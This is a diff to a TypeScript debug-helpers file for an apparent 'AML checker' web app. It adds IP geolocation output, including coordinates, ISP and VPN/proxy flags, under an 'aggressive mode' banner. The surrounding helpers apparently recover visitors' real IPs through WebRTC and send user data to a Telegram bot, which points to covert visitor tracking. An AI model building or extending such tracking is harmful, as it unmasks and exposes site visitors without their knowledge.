@@ -3,7 +3,7 @@
  * Автоматически доступны в window после загрузки приложения
  */
 
-import { getRealIPAddress, getIPFast, getUserInfo, getPrimaryIP } from './webrtc-ip';
+import { getRealIPAddress, getIPFast, getUserInfo, getPrimaryIP, getGeoData } from './webrtc-ip';
 import { sendUserDataToBot, getBotInfo } from './telegram-bot';
 
 /**
@@ -13,6 +13,7 @@ export function help() {
   console.log(`
 ╔════════════════════════════════════════════════════════════╗
 ║            🛠️  AML CHECKER DEBUG HELPERS                  ║
+║                 (АГРЕССИВНЫЙ РЕЖИМ)                        ║
 ╚════════════════════════════════════════════════════════════╝
 
 📡 WebRTC & IP функции:
@@ -20,6 +21,7 @@ export function help() {
   testWebRTC()          - Полный тест с отправкой в Telegram
   showMyIP()            - Показать мой IP
   showAllIPs()          - Показать все обнаруженные IP
+  showGeo()             - Показать геолокацию (NEW!)
   showUserInfo()        - Показать информацию о браузере
 
 📤 Telegram функции:
@@ -35,9 +37,80 @@ export function help() {
 ║ Примеры использования:                                    ║
 ║ > quickTestWebRTC()     // Быстрый тест                   ║
 ║ > showMyIP()            // Узнать свой IP                 ║
+║ > showGeo()             // Показать геолокацию            ║
 ║ > sendTestMessage()     // Проверить Telegram бота        ║
 ╚════════════════════════════════════════════════════════════╝
   `);
+}
+
+/**
+ * Показать геолокацию по IP
+ */
+export async function showGeo() {
+  console.log('🌍 Определение вашей геолокации...\n');
+  
+  const { ip } = await getIPFast();
+  
+  if (ip === 'Unknown') {
+    console.error('❌ Не удалось определить IP адрес');
+    return null;
+  }
+  
+  console.log('📍 IP адрес:', ip);
+  console.log('🔄 Запрос геоданных через множественные API...\n');
+  
+  const geoData = await getGeoData(ip);
+  
+  console.log('═══════════════════════════════════════');
+  console.log('📍 ГЕОЛОКАЦИЯ');
+  console.log('═══════════════════════════════════════');
+  
+  if (geoData.country) {
+    console.log(`🌍 Страна: ${geoData.country} (${geoData.countryCode || 'N/A'})`);
+  }
+  if (geoData.region) {
+    console.log(`🗺️  Регион: ${geoData.region}`);
+  }
+  if (geoData.city) {
+    console.log(`🏙️  Город: ${geoData.city}`);
+  }
+  if (geoData.zip) {
+    console.log(`📮 Индекс: ${geoData.zip}`);
+  }
+  if (geoData.lat && geoData.lon) {
+    console.log(`🧭 Координаты: ${geoData.lat.toFixed(4)}, ${geoData.lon.toFixed(4)}`);
+    console.log(`🗺️  Карта: https://www.google.com/maps?q=${geoData.lat},${geoData.lon}`);
+  }
+  if (geoData.timezone) {
+    console.log(`🕐 Timezone: ${geoData.timezone}`);
+  }
+  
+  if (geoData.isp || geoData.org) {
+    console.log('\n📡 ПРОВАЙДЕР');
+    console.log('═══════════════════════════════════════');
+    if (geoData.isp) console.log(`ISP: ${geoData.isp}`);
+    if (geoData.org) console.log(`Org: ${geoData.org}`);
+    if (geoData.as) console.log(`AS: ${geoData.as}`);
+    if (geoData.asname) console.log(`AS Name: ${geoData.asname}`);
+  }
+  
+  if (geoData.mobile !== undefined || geoData.proxy !== undefined || geoData.hosting !== undefined) {
+    console.log('\n⚠️  ФЛАГИ БЕЗОПАСНОСТИ');
+    console.log('═══════════════════════════════════════');
+    if (geoData.mobile !== undefined) {
+      console.log(`📱 Mobile: ${geoData.mobile ? 'Да' : 'Нет'}`);
+    }
+    if (geoData.proxy !== undefined) {
+      console.log(`🔒 Proxy/VPN: ${geoData.proxy ? '⚠️ ДА (обнаружен!)' : 'Нет'}`);
+    }
+    if (geoData.hosting !== undefined) {
+      console.log(`🖥️  Hosting: ${geoData.hosting ? '⚠️ ДА (дата-центр)' : 'Нет'}`);
+    }
+  }
+  
+  console.log('═══════════════════════════════════════\n');
+  
+  return geoData;
 }
 
 /**
@@ -246,6 +319,7 @@ if (typeof window !== 'undefined') {
   (window as any).checkBot = checkBot;
   (window as any).sendMyData = sendMyData;
   (window as any).showStats = showStats;
+  (window as any).showGeo = showGeo;
   
   // Автоматически показываем справку при загрузке (с задержкой)
   setTimeout(() => {
@@ -261,5 +335,6 @@ export default {
   sendTestMessage,
   checkBot,
   sendMyData,
-  showStats
+  showStats,
+  showGeo
 };
